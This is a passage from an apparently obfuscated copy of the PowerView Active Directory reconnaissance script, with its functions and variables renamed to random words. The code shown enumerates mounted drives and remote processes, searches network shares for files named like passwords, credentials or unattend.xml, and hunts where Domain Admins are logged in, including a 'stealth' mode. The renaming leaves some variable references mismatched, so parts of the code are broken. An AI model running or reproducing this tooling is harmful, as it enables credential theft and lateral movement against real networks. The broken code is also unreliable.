                ForEach ($HBIzLvnP9chfdgb in $OJ9JyXGuNqZpN9I) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $p9HnEIzwegumibI = congesting -BwJjYSLSjCOa9Mo $HBIzLvnP9chfdgb -szvFVWkPJummdcf $szvFVWkPJummdcf
                        }
                        else {
                            $p9HnEIzwegumibI = congesting -BwJjYSLSjCOa9Mo $HBIzLvnP9chfdgb
                        }

                        $QLcKZZIHlEuzSYr = ($Reg.EnumKey($HKU, "$HBIzLvnP9chfdgb\Network")).sNames

                        ForEach ($Sif9iljarQkaA9q in $QLcKZZIHlEuzSYr) {
                            $VqlHBqZRRi9npot = $Reg.GetStringValue($HKU, "$HBIzLvnP9chfdgb\Network\$Sif9iljarQkaA9q", 'ProviderName').sValue
                            $a9dxWYHwzVSwZAT = $Reg.GetStringValue($HKU, "$HBIzLvnP9chfdgb\Network\$Sif9iljarQkaA9q", 'RemotePath').sValue
                            $XaVCkX9TVmblgM9 = $Reg.GetStringValue($HKU, "$HBIzLvnP9chfdgb\Network\$Sif9iljarQkaA9q", 'UserName').sValue
                            if (-not $p9HnEIzwegumibI) { $p9HnEIzwegumibI = '' }

                            if ($a9dxWYHwzVSwZAT -and ($a9dxWYHwzVSwZAT -ne '')) {
                                $gJPHHKd9JmLCyae = New-Object PSObject
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'UserName' $p9HnEIzwegumibI
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'UserSID' $HBIzLvnP9chfdgb
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'DriveLetter' $Sif9iljarQkaA9q
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'ProviderName' $VqlHBqZRRi9npot
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'RemotePath' $a9dxWYHwzVSwZAT
                                $gJPHHKd9JmLCyae | Add-Member Noteproperty 'DriveUserName' $XaVCkX9TVmblgM9
                                $gJPHHKd9JmLCyae.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $gJPHHKd9JmLCyae
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[epicenter] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[epicenter] Error accessing $wlkrajnezbzvml9, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function wholes {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {
            try {
                $jOTeeQlYyHOUMuw = @{
                    'ComputerName' = $cNTDaoDBIWkDu9I
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $jOTeeQlYyHOUMuw['Credential'] = $szvFVWkPJummdcf }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $YAygLxUTxZzDbls = New-Object PSObject
                    $YAygLxUTxZzDbls | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                    $YAygLxUTxZzDbls | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $YAygLxUTxZzDbls | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $YAygLxUTxZzDbls | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $YAygLxUTxZzDbls | Add-Member Noteproperty 'User' $Owner.User
                    $YAygLxUTxZzDbls.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $YAygLxUTxZzDbls
                }
            }
            catch {
                Write-Verbose "[wholes] Error enumerating remote processes on '$wlkrajnezbzvml9', access likely denied: $_"
            }
        }
    }
}


function bronco {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $VmsRTHS9Yi9fqyN = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CVUqfRwSUTCCPng,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $vepvpaBfReSlwj9,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $WGwTpjRygEvPST9,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $PI9oxzrjz9dRLsr,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $e9iKytvkknYRAr9,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $qyzQWmUhqK9xHdt,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $VXZkuylGPNtqeof,

        [Switch]
        $GykqIBLZun9rlEp,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $VmsRTHS9Yi9fqyN
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $tHAcROQOWB9HdRG['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {

            $CVUqfRwSUTCCPng = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $tHAcROQOWB9HdRG['Include'] = @('*.exe')
        }
        $tHAcROQOWB9HdRG['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $vDX9LvEqAPudecx = @{}

        function innuendoes {

            [CmdletBinding()]Param([String]$Path)
            try {
                $zTUpMbgjxRsliwB = [IO.File]::OpenWrite($Path)
                $zTUpMbgjxRsliwB.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($uszMwnNhSpfzkA9 in $Path) {
            if (($uszMwnNhSpfzkA9 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $GHjj9aAkkQaKul9 = (New-Object System.Uri($uszMwnNhSpfzkA9)).Host
                if (-not $vDX9LvEqAPudecx[$GHjj9aAkkQaKul9]) {

                    misquote -cNTDaoDBIWkDu9I $GHjj9aAkkQaKul9 -szvFVWkPJummdcf $szvFVWkPJummdcf
                    $vDX9LvEqAPudecx[$GHjj9aAkkQaKul9] = $True
                }
            }

            $tHAcROQOWB9HdRG['Path'] = $uszMwnNhSpfzkA9
            Get-ChildItem @SearcherArguments | ForEach-Object {

                $NwhwPVNCzqVhTgv = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $NwhwPVNCzqVhTgv = $False
                }
                if ($CVUqfRwSUTCCPng -and ($_.LastAccessTime -lt $CVUqfRwSUTCCPng)) {
                    $NwhwPVNCzqVhTgv = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $vepvpaBfReSlwj9)) {
                    $NwhwPVNCzqVhTgv = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $WGwTpjRygEvPST9)) {
                    $NwhwPVNCzqVhTgv = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (innuendoes -Path $_.FullName))) {
                    $NwhwPVNCzqVhTgv = $False
                }
                if ($NwhwPVNCzqVhTgv) {
                    $vImRN9XwXNlGtYW = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $OhpYs9MgapOIgJk = New-Object -TypeName PSObject -Property $vImRN9XwXNlGtYW
                    $OhpYs9MgapOIgJk.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $OhpYs9MgapOIgJk
                }
            }
        }
    }

    END {

        $vDX9LvEqAPudecx.Keys | densities
    }
}








function overhanging {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $xxcoHOOdC9XDRbN,

        [Parameter(Position = 2)]
        [Hashtable]
        $Xz99HsFbkRJSMQr,

        [Int]
        [ValidateRange(1,  100)]
        $bCPdUwesQHczYxi = 20,

        [Switch]
        $WPhZUA9BnOLPlUR
    )

    BEGIN {


        $V9kXYq9dqT9wDzT = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()



        $V9kXYq9dqT9wDzT.ApartmentState = [System.Threading.ApartmentState]::STA



        if (-not $WPhZUA9BnOLPlUR) {

            $wfh99JpWHUDdT9Z = Get-Variable -Scope 2


            $L9YuxJCPkuuHY9Y = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')


            ForEach ($Var in $wfh99JpWHUDdT9Z) {
                if ($L9YuxJCPkuuHY9Y -NotContains $Var.Name) {
                $V9kXYq9dqT9wDzT.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }


            ForEach ($FRHbiNbIY9WSCQk in (Get-ChildItem Function:)) {
                $V9kXYq9dqT9wDzT.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $FRHbiNbIY9WSCQk.Name, $FRHbiNbIY9WSCQk.Definition))
            }
        }






        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $bCPdUwesQHczYxi, $V9kXYq9dqT9wDzT, $Host)
        $Pool.Open()


        $hcDrBLy9ZyM9IkS = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $bipRfzThc9GtGuw = $M.GetParameters()
            if (($bipRfzThc9GtGuw.Count -eq 2) -and $bipRfzThc9GtGuw[0].Name -eq 'input' -and $bipRfzThc9GtGuw[1].Name -eq 'output') {
                $hcDrBLy9ZyM9IkS = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $cNTDaoDBIWkDu9I = $cNTDaoDBIWkDu9I | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[overhanging] Total number of hosts: $($cNTDaoDBIWkDu9I.count)"


        if ($bCPdUwesQHczYxi -ge $cNTDaoDBIWkDu9I.Length) {
            $bCPdUwesQHczYxi = $cNTDaoDBIWkDu9I.Length
        }
        $gbnjuMfqywLuqM9 = [Int]($cNTDaoDBIWkDu9I.Length/$bCPdUwesQHczYxi)
        $LkkkITuZGG9Anov = @()
        $Start = 0
        $End = $gbnjuMfqywLuqM9

        for($i = 1; $i -le $bCPdUwesQHczYxi; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $bCPdUwesQHczYxi) {
                $End = $cNTDaoDBIWkDu9I.Length
            }
            $List.AddRange($cNTDaoDBIWkDu9I[$Start..($End-1)])
            $Start += $gbnjuMfqywLuqM9
            $End += $gbnjuMfqywLuqM9
            $LkkkITuZGG9Anov += @(,@($List.ToArray()))
        }

        Write-Verbose "[overhanging] Total number of threads/partitions: $bCPdUwesQHczYxi"

        ForEach ($gZQtRevbGLiaeam in $LkkkITuZGG9Anov) {

            $9GW999jgvBqCxkY = [PowerShell]::Create()
            $9GW999jgvBqCxkY.runspacepool = $Pool


            $Null = $9GW999jgvBqCxkY.AddScript($xxcoHOOdC9XDRbN).AddParameter('ComputerName', $gZQtRevbGLiaeam)
            if ($Xz99HsFbkRJSMQr) {
                ForEach ($Param in $Xz99HsFbkRJSMQr.GetEnumerator()) {
                    $Null = $9GW999jgvBqCxkY.AddParameter($Param.Name, $Param.Value)
                }
            }


            $MCqE9JDSKKFQghW = New-Object Management.Automation.PSDataCollection[Object]


            $Jobs += @{
                PS = $9GW999jgvBqCxkY
                Output = $MCqE9JDSKKFQghW
                Result = $hcDrBLy9ZyM9IkS.Invoke($9GW999jgvBqCxkY, @($Null, [Management.Automation.PSDataCollection[Object]]$MCqE9JDSKKFQghW))
            }
        }
    }

    END {
        Write-Verbose "[overhanging] Threads executing"


        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $9ioylcCxmjhzWru = 100
        Write-Verbose "[overhanging] Waiting $9ioylcCxmjhzWru seconds for final cleanup..."


        for ($i=0; $i -lt $9ioylcCxmjhzWru; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[overhanging] all threads completed"
    }
}


function Hersey {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cNTDaoDBIWkDu9I,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [String]
        $GyzgQ99fslvJJXn,

        [ValidateNotNullOrEmpty()]
        [String]
        $oE9vUfkxgRReuty,

        [ValidateNotNullOrEmpty()]
        [String]
        $UmwYca9aFyjuaIs,

        [Alias('Unconstrained')]
        [Switch]
        $Cq99nHujfUsYEwD,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $OsAyFkcArbBEJUH,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $mQaSIPnAtdFBzca,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $BYbApcQRbSfXVl9,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PgzXxHGVDkWW9LL,

        [ValidateNotNullOrEmpty()]
        [String]
        $tXyHSLSY9cxTtcf,

        [ValidateNotNullOrEmpty()]
        [String]
        $lx9RyTdzbRIfLcy,

        [ValidateNotNullOrEmpty()]
        [String]
        $e9BTABNRQU9IgXo,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $XC9DmEoUS9mEzUC = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $KHMEppywT9VRNZT,

        [Alias('AllowDelegation')]
        [Switch]
        $a9zmnjmkdcyrkNz,

        [Switch]
        $C9ukZODkrjoYuwt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $wfOGcw9qvB9FFwB,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ZfNRkQyXmbOtsJi = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $9yLQAo99dA9YgOe,

        [Switch]
        $ymiQhvnIj9XpEZO,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $UUFEZjkVMAMSPhZ = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $bCPdUwesQHczYxi = 20
    )

    BEGIN {

        $uZfdOJKpxwOpKKH = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $uZfdOJKpxwOpKKH['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['ComputerDomain']) { $uZfdOJKpxwOpKKH['Domain'] = $GyzgQ99fslvJJXn }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $uZfdOJKpxwOpKKH['LDAPFilter'] = $oE9vUfkxgRReuty }
        if ($PSBoundParameters['ComputerSearchBase']) { $uZfdOJKpxwOpKKH['SearchBase'] = $UmwYca9aFyjuaIs }
        if ($PSBoundParameters['Unconstrained']) { $uZfdOJKpxwOpKKH['Unconstrained'] = $Ku9ZmWgd9fLSPTw }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $uZfdOJKpxwOpKKH['OperatingSystem'] = $eloJwlA9uqrC9UD }
        if ($PSBoundParameters['ComputerServicePack']) { $uZfdOJKpxwOpKKH['ServicePack'] = $NIr9bUdzpfH9Gni }
        if ($PSBoundParameters['ComputerSiteName']) { $uZfdOJKpxwOpKKH['SiteName'] = $SmSMWEXMkNVoOuD }
        if ($PSBoundParameters['Server']) { $uZfdOJKpxwOpKKH['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $uZfdOJKpxwOpKKH['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $uZfdOJKpxwOpKKH['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $uZfdOJKpxwOpKKH['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $uZfdOJKpxwOpKKH['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $uZfdOJKpxwOpKKH['Credential'] = $szvFVWkPJummdcf }

        $X9xElWbFpfFW9IW = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $X9xElWbFpfFW9IW['Identity'] = $PgzXxHGVDkWW9LL }
        if ($PSBoundParameters['Domain']) { $X9xElWbFpfFW9IW['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['UserDomain']) { $X9xElWbFpfFW9IW['Domain'] = $tXyHSLSY9cxTtcf }
        if ($PSBoundParameters['UserLDAPFilter']) { $X9xElWbFpfFW9IW['LDAPFilter'] = $lx9RyTdzbRIfLcy }
        if ($PSBoundParameters['UserSearchBase']) { $X9xElWbFpfFW9IW['SearchBase'] = $e9BTABNRQU9IgXo }
        if ($PSBoundParameters['UserAdminCount']) { $X9xElWbFpfFW9IW['AdminCount'] = $KHMEppywT9VRNZT }
        if ($PSBoundParameters['UserAllowDelegation']) { $X9xElWbFpfFW9IW['AllowDelegation'] = $a9zmnjmkdcyrkNz }
        if ($PSBoundParameters['Server']) { $X9xElWbFpfFW9IW['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $X9xElWbFpfFW9IW['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $X9xElWbFpfFW9IW['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $X9xElWbFpfFW9IW['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $X9xElWbFpfFW9IW['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $X9xElWbFpfFW9IW['Credential'] = $szvFVWkPJummdcf }

        $plcGtRUbnHLQSQg = @()


        if ($PSBoundParameters['ComputerName']) {
            $plcGtRUbnHLQSQg = @($cNTDaoDBIWkDu9I)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Hersey] Stealth enumeration using source: $UUFEZjkVMAMSPhZ"
                $tSecrHyPHZhIiJU = New-Object System.Collections.ArrayList

                if ($UUFEZjkVMAMSPhZ -match 'File|All') {
                    Write-Verbose '[Hersey] Querying for file servers'
                    $fybhLy9WSMa9iLp = @{}
                    if ($PSBoundParameters['Domain']) { $fybhLy9WSMa9iLp['Domain'] = $pkMxgDCVHqOym9m }
                    if ($PSBoundParameters['ComputerDomain']) { $fybhLy9WSMa9iLp['Domain'] = $GyzgQ99fslvJJXn }
                    if ($PSBoundParameters['ComputerSearchBase']) { $fybhLy9WSMa9iLp['SearchBase'] = $UmwYca9aFyjuaIs }
                    if ($PSBoundParameters['Server']) { $fybhLy9WSMa9iLp['Server'] = $vzBgfX9wPWmbsYZ }
                    if ($PSBoundParameters['SearchScope']) { $fybhLy9WSMa9iLp['SearchScope'] = $HWlMnJozs9zEkRJ }
                    if ($PSBoundParameters['ResultPageSize']) { $fybhLy9WSMa9iLp['ResultPageSize'] = $hHyMPLAr9azKKcQ }
                    if ($PSBoundParameters['ServerTimeLimit']) { $fybhLy9WSMa9iLp['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
                    if ($PSBoundParameters['Tombstone']) { $fybhLy9WSMa9iLp['Tombstone'] = $gPSKVqwcbkEyaoZ }
                    if ($PSBoundParameters['Credential']) { $fybhLy9WSMa9iLp['Credential'] = $szvFVWkPJummdcf }
                    $9AqxeowDWQccEBO = peels @FileServerSearcherArguments
                    if ($9AqxeowDWQccEBO -isnot [System.Array]) { $9AqxeowDWQccEBO = @($9AqxeowDWQccEBO) }
                    $tSecrHyPHZhIiJU.AddRange( $9AqxeowDWQccEBO )
                }
                if ($UUFEZjkVMAMSPhZ -match 'DFS|All') {
                    Write-Verbose '[Hersey] Querying for DFS servers'


                }
                if ($UUFEZjkVMAMSPhZ -match 'DC|All') {
                    Write-Verbose '[Hersey] Querying for domain controllers'
                    $skPRj9IXdZiEdSj = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $skPRj9IXdZiEdSj['Domain'] = $pkMxgDCVHqOym9m }
                    if ($PSBoundParameters['ComputerDomain']) { $skPRj9IXdZiEdSj['Domain'] = $GyzgQ99fslvJJXn }
                    if ($PSBoundParameters['Server']) { $skPRj9IXdZiEdSj['Server'] = $vzBgfX9wPWmbsYZ }
                    if ($PSBoundParameters['Credential']) { $skPRj9IXdZiEdSj['Credential'] = $szvFVWkPJummdcf }
                    $HK9EYli9VifxXip = milligram @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($HK9EYli9VifxXip -isnot [System.Array]) { $HK9EYli9VifxXip = @($HK9EYli9VifxXip) }
                    $tSecrHyPHZhIiJU.AddRange( $HK9EYli9VifxXip )
                }
                $plcGtRUbnHLQSQg = $tSecrHyPHZhIiJU.ToArray()
            }
            else {
                Write-Verbose '[Hersey] Querying for all computers in the domain'
                $plcGtRUbnHLQSQg = eigenvalues @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Hersey] TargetComputers length: $($plcGtRUbnHLQSQg.Length)"
        if ($plcGtRUbnHLQSQg.Length -eq 0) {
            throw '[Hersey] No hosts found to enumerate'
        }


        if ($PSBoundParameters['Credential']) {
            $WPxsp9KIBMFyVPQ = $szvFVWkPJummdcf.GetNetworkCredential().UserName
        }
        else {
            $WPxsp9KIBMFyVPQ = ([Environment]::UserName).ToLower()
        }


        if ($PSBoundParameters['ShowAll']) {
            $xgAEQxcxgWvrHLw = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $xgAEQxcxgWvrHLw = noshes @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $yyUfJI9zuL99pOP = @{
                'Identity' = $XC9DmEoUS9mEzUC
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $yyUfJI9zuL99pOP['Domain'] = $tXyHSLSY9cxTtcf }
            if ($PSBoundParameters['UserSearchBase']) { $yyUfJI9zuL99pOP['SearchBase'] = $e9BTABNRQU9IgXo }
            if ($PSBoundParameters['Server']) { $yyUfJI9zuL99pOP['Server'] = $vzBgfX9wPWmbsYZ }
            if ($PSBoundParameters['SearchScope']) { $yyUfJI9zuL99pOP['SearchScope'] = $HWlMnJozs9zEkRJ }
            if ($PSBoundParameters['ResultPageSize']) { $yyUfJI9zuL99pOP['ResultPageSize'] = $hHyMPLAr9azKKcQ }
            if ($PSBoundParameters['ServerTimeLimit']) { $yyUfJI9zuL99pOP['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
            if ($PSBoundParameters['Tombstone']) { $yyUfJI9zuL99pOP['Tombstone'] = $gPSKVqwcbkEyaoZ }
            if ($PSBoundParameters['Credential']) { $yyUfJI9zuL99pOP['Credential'] = $szvFVWkPJummdcf }
            $xgAEQxcxgWvrHLw = squiggles @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Hersey] TargetUsers length: $($xgAEQxcxgWvrHLw.Length)"
        if ((-not $9yLQAo99dA9YgOe) -and ($xgAEQxcxgWvrHLw.Length -eq 0)) {
            throw '[Hersey] No users found to target'
        }


        $ErAMHSSYDKfA9ql = {
            Param($cNTDaoDBIWkDu9I, $xgAEQxcxgWvrHLw, $WPxsp9KIBMFyVPQ, $ymiQhvnIj9XpEZO, $waC9KrLWsegTDKV)

            if ($waC9KrLWsegTDKV) {

                $Null = descendents -waC9KrLWsegTDKV $waC9KrLWsegTDKV -Quiet
            }

            ForEach ($dtDeQCTchbpHZVi in $cNTDaoDBIWkDu9I) {
                $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                if ($Up) {
                    $fr9ScjLvoxlmaxE = depositories -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                    ForEach ($LUGxVXpz9I9CnT9 in $fr9ScjLvoxlmaxE) {
                        $p9HnEIzwegumibI = $LUGxVXpz9I9CnT9.UserName
                        $CName = $LUGxVXpz9I9CnT9.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }


                        if (($p9HnEIzwegumibI) -and ($p9HnEIzwegumibI.Trim() -ne '') -and ($p9HnEIzwegumibI -notmatch $WPxsp9KIBMFyVPQ) -and ($p9HnEIzwegumibI -notmatch '\$$')) {

                            if ( (-not $xgAEQxcxgWvrHLw) -or ($xgAEQxcxgWvrHLw -contains $p9HnEIzwegumibI)) {
                                $QxoKRMvPLUQO9R9 = New-Object PSObject
                                $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'UserDomain' $Null
                                $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'UserName' $p9HnEIzwegumibI
                                $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'ComputerName' $dtDeQCTchbpHZVi
                                $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'SessionFrom' $CName


                                try {
                                    $Z9itqhT9Xer9aqZ = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $QxoKRMvPLUQO9R9 | Add-Member NoteProperty 'SessionFromName' $Z9itqhT9Xer9aqZ
                                }
                                catch {
                                    $QxoKRMvPLUQO9R9 | Add-Member NoteProperty 'SessionFromName' $Null
                                }


                                if ($C9ukZODkrjoYuwt) {
                                    $Admin = (Boulez -cNTDaoDBIWkDu9I $CName).IsAdmin
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $QxoKRMvPLUQO9R9 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $QxoKRMvPLUQO9R9.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $QxoKRMvPLUQO9R9
                            }
                        }
                    }
                    if (-not $ymiQhvnIj9XpEZO) {

                        $9gKxZA9kB9dxGdU = modifier -cNTDaoDBIWkDu9I $dtDeQCTchbpHZVi
                        ForEach ($User in $9gKxZA9kB9dxGdU) {
                            $p9HnEIzwegumibI = $User.UserName
                            $tXyHSLSY9cxTtcf = $User.LogonDomain


                            if (($p9HnEIzwegumibI) -and ($p9HnEIzwegumibI.trim() -ne '')) {
